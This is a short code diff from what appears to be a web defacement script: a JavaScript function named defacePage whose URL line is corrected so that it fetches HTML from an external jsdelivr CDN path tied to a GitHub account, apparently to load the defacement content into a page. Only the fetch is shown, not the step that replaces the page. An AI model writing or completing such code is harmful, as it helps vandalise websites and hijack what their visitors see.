@@ -1,7 +1,7 @@
 async function defacePage() {
     try {
         // URL of the HTML content you want to load
-        const url = 'https://cdn.jsdelivr.n...anothershahid/MrViisit@index.html';
+        const url = 'https://cdn.jsdelivr.net/gh/anothershahid/MrViisit@main/index.html';
         
         // Fetch the content of the external HTML page
         const response = await fetch(url);
